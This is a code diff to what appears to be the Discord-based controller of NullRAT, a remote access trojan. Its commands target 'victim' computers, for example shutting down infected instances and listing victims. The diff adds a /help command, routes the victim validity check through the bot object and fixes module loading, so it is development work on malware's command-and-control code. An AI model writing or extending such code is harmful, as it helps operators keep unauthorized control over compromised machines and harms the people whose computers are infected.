@@ -144,7 +144,7 @@ async def shutdown(ctx, victim):
     ----------
     victim: Identifier of the affected computer (found via /listvictims)
     """
-    if valid(victim):
+    if ctx.bot.valid(victim):
         await ctx.response.send_message(
             embed=client.genEmbed(
                 "Shutting down NullRAT for **" + rererere + "**...",
@@ -158,6 +158,23 @@ async def shutdown(ctx, victim):
 async def shutdown_all(ctx):
     """Shuts down all instances of NullRAT"""
     await ctx.response.send_message("Are you sure?", view=closeall_confirm())
+
+
+@client.slash_command(name="help")
+async def help_command(ctx):
+    """Displays all available commands and their descriptions"""
+
+    embed = client.genEmbed("Available commands", datetime.now())
+    for cmd in sorted(ctx.bot.slash_commands.values(), key=lambda c: c.name):
+        if cmd.name == "help":
+            continue
+        embed.add_field(
+            name=f"/{cmd.name}",
+            value=cmd.description or "No description provided.",
+            inline=False,
+        )
+
+    await ctx.response.send_message(embed=embed)
 
 
 # > shutdown class
@@ -217,11 +234,7 @@ extensions = (
 )
 
 for ex in extensions:
-    ## For debugging
-    # client.load_extension("modules."+ex)
-
-    ## For production
-    client.load_extension(ex)
+    client.load_extension(f"modules.{ex}")
 
 
 # > <start>
